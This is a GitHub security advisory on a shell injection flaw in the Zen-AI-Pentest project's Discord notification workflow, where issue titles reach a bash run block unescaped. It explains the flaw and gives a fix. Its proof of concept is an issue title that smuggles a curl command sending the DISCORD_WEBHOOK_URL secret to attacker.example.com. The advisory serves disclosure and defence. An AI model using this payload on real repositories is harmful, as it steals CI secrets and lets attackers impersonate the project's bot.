# [C] Zen-AI-Pentest has Shell Injection via untrusted issue title in ZenClaw Discord Integration workflow

## Summary
Severity: Critical
Advisory: GHSA-f67f-hcr6-94mf
CWE: CWE-78
Ecosystem: GitHub Actions
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-03-20
Source: https://github.com/advisories/GHSA-f67f-hcr6-94mf
Type: github-advisory

## Affected
- GitHub Actions: `SHAdd0WTAka/Zen-Ai-Pentest` — affected >=0

## Details
## Summary

The `ZenClaw Discord Integration` GitHub Actions workflow is vulnerable to shell command injection. The issue title field, controllable by any GitHub user, is interpolated directly into a `run` shell block via a GitHub Actions template expression. An attacker can craft an issue title containing a subshell expression that executes arbitrary commands on the runner during variable assignment, enabling exfiltration of the `DISCORD_WEBHOOK_URL` secret. The trigger requires no repository privileges.

## Affected Component

**File:** `.github/workflows/zenclaw-discord.yml`  
**Commit:** `07e65c72656a8213fc9ece2b3f4fc719032cfc5d`  
**URL:** `https://github.com/SHAdd0WTAka/Zen-Ai-Pentest/blob/07e65c72656a8213fc9ece2b3f4fc719032cfc5d/.github/workflows/zenclaw-discord.yml`  
**Step:** `Prepare Notification`  
**Trigger:** `issues: [opened]` — no repository privileges required

---

## Description

In the `Prepare Notification` step, the issue title is assigned to a shell variable using direct GitHub Actions template interpolation inside a `case` block:

```bash
issues)
  ...
  DESCRIPTION="${{ github.event.issue.title }}"
  ;;
```

The GitHub Actions template engine resolves `${{ github.event.issue.title }}` **at workflow compilation time**, embedding the raw issue title as literal text in the bash script before execution. The value is assigned inside a double-quoted string, which in bash evaluates subshell expressions of the form `$(...)` and backtick expressions `` `...` `` at runtime.

Although a subsequent sanitization step is applied:

```bash
DESCRIPTION=$(echo "$DESCRIPTION" | tr '\n' ' ' | cut -c1-1000)
```

This sanitization runs **after** the assignment — the subshell in the title has already executed by the time `tr` and `cut` process the output. The sanitization is therefore ineffective as a security control against command injection.

The resulting `DESCRIPTION` value is then written to `$GITHUB_OUTPUT`:

```bash
echo "description=$DESCRIPTION" >> $GITHUB_OUTPUT
```

This additional write is performed without a multiline-safe delimiter, enabling a secondary `$GITHUB_OUTPUT` injection if the title contains a newline, which could overwrite downstream output variables such as `color` or `title`.

---

## Attack Vector

1. Any GitHub user (no repository role required) opens an issue with a malicious title.
2. The `issues: opened` trigger fires automatically — no human interaction or approval needed.
3. The subshell expression in the title executes during variable assignment in the `Prepare Notification` step.
4. The injected command runs with access to all secrets available to the runner.

---

## Proof of Concept

An attacker opens an issue with the following title:

```
bug$(curl -s "https://attacker.example.com/exfil?wh=$(printenv DISCORD_WEBHOOK_URL | base64 -w0)")
```

The rendered bash assignment becomes:

```bash
DESCRIPTION="bug$(curl -s "https://attacker.example.com/exfil?wh=$(printenv DISCORD_WEBHOOK_URL | base64 -w0)")"
```

The subshell executes during assignment, sending the base64-encoded `DISCORD_WEBHOOK_URL` to the attacker's server before the sanitization step runs. The attacker can then use the stolen webhook URL to send arbitrary messages to the Discord channel impersonating the legitimate bot.

---

## Impact

- **Confidentiality (High):** Exfiltration of `DISCORD_WEBHOOK_URL`, granting the attacker the ability to send arbitrary messages to the Discord channel indefinitely, impersonating the ZenClaw bot.
- **Integrity (High):** With the webhook URL, an attacker can post false security alerts, fake workflow failure notifications, or misleading status updates to the Discord channel, potentially causing incident response actions based on fabricated data.
- **Availability (None):** No direct availability impact.

---

## Recommended Fix

Pass all user-controlled event fields as environment variables and reference them via shell variables in the `run` block. Never use `${{ }}` expressions inside `run` blocks for user-controlled data.

**Vulnerable pattern:**
```yaml
run: |
  DESCRIPTION="${{ github.event.issue.title }}"
```

**Safe pattern — declare in `env:`, reference as shell variable:**
```yaml
- name: Prepare Notification
  id: prep
  env:
    ISSUE_TITLE: ${{ github.event.issue.title }}
    COMMIT_MSG: ${{ github.event.head_commit.message }}
    WORKFLOW_NAME: ${{ github.event.workflow_run.name }}
    DISPATCH_MSG: ${{ github.event.inputs.message }}
    EVENT_ACTION: ${{ github.event.action }}
    WORKFLOW_CONCLUSION: ${{ github.event.workflow_run.conclusion }}
  run: |
    case "$EVENT" in
      issues)
        DESCRIPTION="$ISSUE_TITLE"
        ;;
      ...
    esac
    DESCRIPTION=$(echo "$DESCRIPTION" | tr '\n' ' ' | cut -c1-1000)
```

With values passed through `env:`, the Actions engine sets them as environment variables before the shell starts. Shell variable references (`$ISSUE_TITLE`) are expanded by bash at runtime without executing subshell expressions embedded in the value.

---

## References

- [CWE-78: Improper Neutralization of Special Elements used in an OS Command (OS Command Injection)](https://cwe.mitre.org/data/definitions/78.html)
- [GitHub Actions Security Hardening — Understand the risk of script injections](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)
- [Keeping your GitHub Actions and workflows secure: Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)

## References
- https://github.com/SHAdd0WTAka/Zen-Ai-Pentest/security/advisories/GHSA-f67f-hcr6-94mf
- https://github.com/SHAdd0WTAka/Zen-Ai-Pentest/commit/26c4e07df780f11b7e901ad2d88b3dc5ce8a1aca
- https://github.com/SHAdd0WTAka/Zen-Ai-Pentest
